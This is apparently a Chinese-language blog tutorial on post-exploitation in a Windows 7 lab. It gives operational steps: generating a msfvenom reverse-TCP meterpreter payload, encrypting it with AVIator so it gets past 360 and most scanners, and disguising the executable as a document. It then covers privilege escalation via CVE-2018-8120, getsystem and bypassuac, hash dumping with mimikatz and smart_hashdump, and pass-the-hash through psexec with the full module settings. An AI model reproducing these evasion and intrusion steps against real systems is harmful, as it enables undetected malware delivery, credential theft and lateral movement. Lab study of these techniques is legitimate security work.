---
layout: post
title:  "后渗透之免杀+提权to Passing the Hash"
categories: 后渗透
tags: 渗透测试 渗透 提权
author: 柠枫
---



* content
{:toc}








## 前言

完整攻击链大概包括信息搜集、漏洞利用、建立据点、权限提升、权限维持、横向移动、痕迹清除等七步，本次我们将注重探索建立据点以及权限提升，对于新手来说具有较好的参考性

### 免杀

环境为windows7+360 首先让我们来看看是怎么样的

![图片1.png](https://i.loli.net/2020/02/02/EruKs1Fqjkv67xV.png)

Msf.exe是原本未经过任何处理的木马， 使用msfvenom -p windows/meterpreter/reverse_tcp LHOST=XXXX LPORT=XXXX -o msf.exe 让我们先看看他的查杀效果

![图片2.png](https://i.loli.net/2020/02/02/8nQiAwPgaZT2m34.png)

![图片3.png](https://i.loli.net/2020/02/02/Bug2TNOFZjIG8r7.png)

果然 360安全卫士十分不给面子的报毒了 而且这个360巨卡 把我的虚拟机都快卡崩了，为了后续的实验我们选择360杀毒 效果是一样的

![图片4.png](https://i.loli.net/2020/02/02/BWsmz8f1YEbdSkG.png)

选择自定义扫描去扫Desktop的msf.exe

![图片5.png](https://i.loli.net/2020/02/02/iw4zg9BoFernPK6.png)

毕竟我们没有做任何处理 扑街还是很正常的嘛，那我们现在上一波小免杀去和他对抗对抗。先大概说说免杀：

## 免杀概念

免杀，也就是反病毒（AntiVirus）与反间谍（AntiSpyware）的对立面，英文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”

## 杀毒软件监测方式

### 扫描技术

> 1、扫描压缩包技术：即是对压缩包案和封装文件作分析检查的技术    
> 2、程序窜改防护：即是避免恶意程序借由删除杀毒侦测程序而大肆破坏电脑  
> 3、修复技术：即是对恶意程序所损坏的文件进行还原  
> 4、急救盘杀毒：利用空白U盘制作急救启动盘，来检测电脑病毒  
> 5、智能扫描：扫描最常用的磁盘，系统关键位置，耗时较短  
> 6、全盘扫描：扫描电脑全部磁盘，耗时较长  
> 7、勒索软件防护：保护电脑中的文件不被黑客恶意加密  
> 8、开机扫描：当电脑开机时自动进行扫描，可以扫描压缩文档和可能不需要的程序  

### 监控技术

> 1、内存监控：当发现内存中存在病毒的时候，就会主动报警；监控所有进程；监控读取到内存中的文件；监控读取到内存的网络数据  
> 2、文件监控：当发现写到磁盘上的文件中存在病毒，或者是被病毒感染，就会主动报警  
> 3、邮件监控：当发现电子邮件的附件存在病毒时进行拦截  
> 4、网页防护：阻止网络攻击和不安全下载  
> 5、行为防护：提醒用户可疑的应用程序行为  

### 扫描引擎

#### 特征码扫描

机制：将扫描信息与病毒数据库（即所谓的“病毒特征库”）进行对照，如果信息与其中的任何一个病毒特征符合，杀毒软件就会判断此文件被病毒感染。杀毒软件在进行查杀的时候，会挑选文件内部的一段或者几段代码来作为他识别病毒的方式，这种代码就叫做病毒的特征码；在病毒样本中，抽取特征代码；抽取的代码比较特殊，不大可能与普通正常程序代码吻合；抽取的代码要有适当长度，一方面维持特征代码的唯一性，另一方面保证病毒扫描时候不要有太大的空间与时间的开销  
特征码类别：  
> 1.文件特征码：对付病毒在文件中的存在方式：单一文件特征码、复合文件特征码（通过多处特征进行判断）    
> 2.内存特征码：对付病毒在内存中的存在方式：单一内存特征码、复合内存特征码  

优点：速度快，配备高性能的扫描引擎；准确率相对比较高，误杀操作相对较少；很少需要用户参与  
缺点：采用病毒特征代码法的检测工具，面对不断出现的新病毒，必须不断更新病毒库的版本，否则检测工具便会老化，逐渐失去实用价值；病毒特征代码法对从未见过的新病毒，无法知道其特征代码，因而无法去检测新病毒；病毒特征码如果没有经过充分的检验，可能会出现误报，数据误删，系统破坏，给用户带来麻烦  

#### 文件效验和法

对文件进行扫描后，可以将正常文件的内容，计算其校验和，将该校验和写入文件中或写入别的文件中保存；在文件使用过程中，定期地或每次使用文件前，检查文件现在内容算出的校验和与原来保存的校验和是否一致，因而可以发现文件是否感染病毒  

#### 进程行为监测法（沙盒模式）

机制：通过对病毒多年的观察、研究，有一些行为是病毒的共同行为，而且比较特殊，在正常程序中，这些行为比较罕见。当程序运行时，监视其进程的各种行为，如果发现了病毒行为，立即报警  
优缺点：
> 1.优点：可发现未知病毒、可相当准确地预报未知的多数病毒  
> 2.缺点：可能误报警、不能识别病毒名称、有一定实现难度、需要更多的用户参与判断  

#### 主动防御技术

主动防御并不需要病毒特征码支持，只要杀毒软件能分析并扫描到目标程序的行为，并根据预先设定的规则，判定是否应该进行清除操作 主动防御本来想领先于病毒，让杀毒软件自己变成安全工程师来分析病毒，从而达到以不变应万变的境界。但是，计算机的智能总是在一系列的规则下诞生，而普通用户的技术水平达不到专业分析病毒的水平，两者之间的博弈将主动防御推上一个尴尬境地  

#### 机器学习识别技术

机器学习识别技术既可以做静态样本的二进制分析，又可以运用在沙箱动态行为分析当中，是为内容/行为+算法模式。伴随着深度学
习的急速发展，各家厂商也开始尝试运用深度学习技术来识别病毒特征，如瀚思科技的基于深度学习的二进制恶意样本检测

我这里选择360杀毒+virustotal和virscan进行一个国内外的杀毒对比，效果比较具有参考性，其实想过全部的杀软也不是不可能，只不过刚出来恐怕就x掉了，所以其实我们只需要过目标机的杀软就行了，没有必要去舍近求远

## AVIator免杀

我这里选择的是 AVIator免杀:

AVIator使用AES加密来加密Shellcode，生成一个包含加密有效负载的可执行文件，然后使用各种注入技术将shellcode解密并注入到目标系统，从而绕过杀毒软件的检测。

AVlator下载安装：  
AVIator只有windows版，c#开发，单文件exe  
安装也非常方便，直接从github上下载下来  
git clone https://github.com/Ch0pin/AVIator  
或者直接下载压缩包https://github.com/Ch0pin/AVIator/archive/master.zip  
解压后在Compiled Binaries文件夹中有x86和x64的可执行exe文件，执行即可  
![图片6.png](https://i.loli.net/2020/02/02/a4gsXNQSiInw2K3.png)

选择系统位数打开 可以看到界面是这样的

![图片7.png](https://i.loli.net/2020/02/02/m1UbGDsrwRPcu8Y.png)

使用也非常简单 对新手来说比较友好，填入payload后直接生成即可， 那我们正式开始吧

首先使用msf生成shellcode 要基于C# 所以的话这样生成一个简单的：

![图片8.png](https://i.loli.net/2020/02/02/mbUSDWwztECJihG.png)

在AVIator中对shellcode进行处理，AES KEY和IV默认就可以

把payload地方填入上面生成的文件内容，然后点击Encrypt，生成加密后的payload

![图片9.png](https://i.loli.net/2020/02/02/hepBO5muVCKiQf4.png)

为了方便我直接使用mousepad

操作系统的话我们直接默认就好 点击生成

![图片10.png](https://i.loli.net/2020/02/02/OGvreNkXDIyKBP5.png)

下面还有个Injection Techniques，需要选择注入技术，我们选择第默认进程即可

![图片11.png](https://i.loli.net/2020/02/02/AIeLZ2Ea7tuhq39.png)

然后在select PATH选择生成的目录 然后直接生成即可，但文件还是可以正常被当做exe执行的。比如可以伪装成doc啊txt啊什么的，但是RTLO选项虽然更迷惑人，但也更容易被杀软报警告。这也许就是鱼和熊掌不可兼得吧！

此外还可以自定义ico图标 作为演示我这里就不弄了 大家下来可以自行研究

![图片12.png](https://i.loli.net/2020/02/02/KS8x9sUwmD6g1PM.png)

点generate就可以成功生成exe了，我们接下来去看看吧！

![图片13.png](https://i.loli.net/2020/02/02/MHTVyWPjC2EfpUe.png)

启动msfconsole 开启对应的监听模块 然后直接运行看看！

先看看360杀毒怎么说 为了做对比 我把msf.exe没有删除 还是自定义扫描桌面，7.exe即为我们刚刚免杀的马

![图片14.png](https://i.loli.net/2020/02/02/Wbc7qywBjNRJTdS.png)

可以看到我们已经成功过了360杀毒 然后再去两个杀软平台看看！

![图片15.png](https://i.loli.net/2020/02/02/AJXCfvWx8askHji.png)

virustotal是31/69 看起来还可以的过了一大半 哈哈，然后去看看virscan

![图片16.png](https://i.loli.net/2020/02/02/3P8yhRT5s9XpmEe.png)

这个就比较不错了 三个报毒，效果还是很得劲的

然后试试上线情况！

![图片17.png](https://i.loli.net/2020/02/02/6KyAwexhdfUnz8Z.png)

Ok没毛病 然后我们来 Get Power！

![图片18.png](https://i.loli.net/2020/02/02/lQq1jKESkxCR9dr.png)

首先getuid看当前权限 可以看到是一个普通的管理员，为了方便我们这里使用两种方式提权

![图片19.png](https://i.loli.net/2020/02/02/DhgkYEFXfezCa31.png)

Background返回msf控制台后，可以看到的确只有一个session且 当前用户为管理员。

我们可以使用ms18_8120来提权：

Use exploit/windows/local/ms18_8120_win32k_privesc

![图片20.png](https://i.loli.net/2020/02/02/1BzSmpAYL2f3s9E.png)

Show options后可以看到只需要设置一个session就可以了 非常方便

![图片21.png](https://i.loli.net/2020/02/02/1i2483LHK6dSeyv.png)

获取到meterpreter后getuid发现现在已经是system权限了，非常给力。原理呢其实就是cve-2018-8120 ：部分版本Windows系统win32k.sys组件的NtUserSetImeInfoEx()系统服务函数内部未验证内核对象中的空指针对象,普通应用程序可利用该空指针漏洞以内核权限执行任意代码。https://github.com/unamer/CVE-2018-8120/ 在github这里也有详细的介绍和exp

然后我们来试试meterpreter的自带getsystem提权！

![图片22.png](https://i.loli.net/2020/02/02/iA3oG4ZWlK2uBYX.png)

因为我这边其实把uac已经关闭掉了，所以getsystem可以直接成功 uac开启状态下的提权又要如何提权呢？

UAC：用户帐户控制（User Account Control，简写作UAC)是微软公司在其Windows Vista及更高版本操作系统中采用的一种控制机制。其原理是通知用户是否对应用程序使用硬盘驱动器和系统文件授权，以达到帮助阻止恶意程序（有时也称为“恶意软件”）损坏系统的效果

可以使用msf自带的bypassuac模块

![图片23.png](https://i.loli.net/2020/02/02/pWzSLbKM8riAtNg.png)

可以看到同样只需设置一个session 很简单 这里就不多做演示了

![图片24.png](https://i.loli.net/2020/02/02/yZXnjlDPRiMvLp6.png)

然后我们来PassingTheHash!

为什么要拿到管理员的Hash呢？ 在渗透测试的过程中动静太大的话难免引起怀疑和管理员的惊吓，所以要尽可能的减少动静，轻声慢步。抓明文密码可以直接使用mimikatz，也是比较不错的

MIMIKATZ：是法国人Gentil Kiwi编写的一款windows平台下的神器，它具备很多功能，其中最亮的功能是直接从 lsass.exe 进程里获取windows处于active状态账号的明文密码。mimikatz的功能不仅如此，它还可以提升进程权限，注入进程，读取进程内存等等，mimikatz包含了很多本地模块，更像是一个轻量级的调试器

![图片25.png](https://i.loli.net/2020/02/02/94UKzR5EG3Tk6em.png)

Load mimikatz后直接使用mav来抓取hash 不过本例中失败了 应该需要直接给目标机上传正版mimikatz才行 但没有关系 我们还有hashdump

可以使用 run post/windows/gather/smart_hashdump来加载模块 并直接抓取hash 其格式为：用户名:rid:LM-Hash:NTLM -Hash  NTLM相对而言更安全

![图片26.png](https://i.loli.net/2020/02/02/dCOTt7Hf9U5hA4K.png)

它会首先检查当前权限和系统类型：

然后检查是否在域里面 是否是DC

从注册表读取hash 注入lsass进程

如果是server08且有管理员权限 直接getsystem尝试提权

如果是win7且bypass了uac或者uac没开启 那么从注册表读取

03/xp直接getsystem 从注册表读取

小结：hash的抓取尽量在高权限session运行 尽量取得更高权限

然后我们来尝试hash传递 直接使用hash来获取session！  

抓取到的hash为：aad3b435b51404eeaad3b435b51404ee:f832c97158a808944c395b74aed1e38e

我们使用psexec模块 ：exploit/windows/smb/psexec

![图片27.png](https://i.loli.net/2020/02/02/COSd8Nq4GF5mkDx.png)

这个模块需要开启smb服务 也就是445端口 ok我们来设置options

set rhost 192.168.179.132

set SMBUser ningfeng

set SMBPass aad3b435b51404eeaad3b435b51404ee:f832c97158a808944c395b74aed1e38e

set payload windows/meterpreter/reverse_tcp

set LHOST 192.168.179.129

Set LPORT 4444

都设置完毕后直接exploit 即可获取一个高权限session

![图片28.png](https://i.loli.net/2020/02/02/AJER3crNDQ9ZVwf.png)

OK 完毕 本文着重讲解了拿到meterpreter会话后的一系列后渗透操作，从免杀到get hash 对新手来说具有参考性和很强的实践性  

后渗透其实也远远不止这么多 需要探索的依旧很多很多 愿我们一直前行！
